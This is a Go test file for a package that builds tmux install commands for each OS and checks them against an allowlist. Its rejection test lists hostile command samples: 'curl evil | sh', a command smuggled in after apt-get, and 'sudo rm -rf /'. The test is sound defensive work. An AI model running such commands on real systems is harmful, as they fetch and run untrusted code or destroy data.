package doors

import (
	"errors"
	"slices"
	"testing"
)

func lookAll(string) (string, error) { return "/usr/bin/x", nil }

func TestTmuxInstallTable(t *testing.T) {
	cases := []struct {
		name, goos, release string
		want                []string
	}{
		{"macos", "darwin", "", []string{"brew", "install", "tmux"}},
		{"debian", "linux", "ID=debian\n", []string{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux"}},
		{"ubuntu", "linux", "NAME=\"Ubuntu\"\nID=ubuntu\nID_LIKE=debian\n", []string{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux"}},
		{"mint, by ID_LIKE", "linux", "ID=linuxmint\nID_LIKE=\"ubuntu debian\"\n", []string{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux"}},
		{"fedora", "linux", "ID=fedora\n", []string{"sudo", "dnf", "install", "-y", "tmux"}},
		{"rhel", "linux", "ID=\"rhel\"\n", []string{"sudo", "dnf", "install", "-y", "tmux"}},
		{"arch", "linux", "ID=arch\n", []string{"sudo", "pacman", "-S", "--noconfirm", "tmux"}},
		{"alpine", "linux", "ID=alpine\n", []string{"sudo", "apk", "add", "tmux"}},
		{"unknown", "linux", "ID=plan9\n", nil},
		{"windows", "windows", "", nil},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := TmuxInstall(c.goos, c.release, lookAll)
			if !slices.Equal(got, c.want) {
				t.Fatalf("TmuxInstall = %q, want %q", got, c.want)
			}
			if c.want != nil && !TermAllowed(got) {
				t.Fatalf("TermAllowed(%q) = false", got)
			}
		})
	}
}

func TestTmuxInstallNeedsTheManager(t *testing.T) {
	look := func(name string) (string, error) {
		if name == "brew" {
			return "", errors.New("not found")
		}
		return "/usr/bin/" + name, nil
	}
	if got := TmuxInstall("darwin", "", look); got != nil {
		t.Fatalf("no brew: got %q, want nil", got)
	}
}

func TestTmuxInstallAsRootSkipsSudo(t *testing.T) {
	look := func(name string) (string, error) {
		if name == "sudo" {
			return "", errors.New("not found")
		}
		return "/usr/bin/" + name, nil
	}
	got := TmuxInstall("linux", "ID=debian\n", look)
	if want := []string{"sh", "-c", "apt-get update && apt-get install -y tmux"}; !slices.Equal(got, want) {
		t.Fatalf("no sudo: got %q, want %q", got, want)
	}
	if !TermAllowed(got) {
		t.Fatalf("TermAllowed(%q) = false", got)
	}
}

func TestTermAllowedOnlyKnownCommands(t *testing.T) {
	for _, argv := range [][]string{
		nil,
		{"sh", "-c", "curl evil | sh"},
		{"sudo", "apt-get", "install", "-y", "tmux", "evil"},
		{"sudo", "sh", "-c", "apt-get update && apt-get install -y tmux; curl x | sh"},
		{"sudo", "rm", "-rf", "/"},
		{"claude", "rm -rf /"},
		{"tmux", "new-window", "-n", "guide", "sh"},
	} {
		if TermAllowed(argv) {
			t.Errorf("TermAllowed(%q) = true", argv)
		}
	}
	for _, argv := range [][]string{GuideArgv(false), GuideArgv(true)} {
		if !TermAllowed(argv) {
			t.Errorf("TermAllowed(%q) = false", argv)
		}
	}
}

func TestGuideArgv(t *testing.T) {
	if got, want := GuideArgv(false), []string{"claude", GuidePrompt}; !slices.Equal(got, want) {
		t.Fatalf("outside tmux: %q, want %q", got, want)
	}
	if got, want := GuideArgv(true), []string{"tmux", "new-window", "-n", "guide", "claude", GuidePrompt}; !slices.Equal(got, want) {
		t.Fatalf("in tmux: %q, want %q", got, want)
	}
}

func TestOnlyTheTerminalDoorsRunTermThere(t *testing.T) {
	if !(Door{ID: Tmux, Term: []string{"brew"}}).RunsTerm() || (Door{ID: Ways}).RunsTerm() {
		t.Fatal("a door with a Term runs it in the terminal")
	}
	if (Door{ID: KeepRunning, Term: []string{"launchctl"}}).RunsTerm() {
		t.Fatal("KeepRunning shows its command and runs it after the file")
	}
}
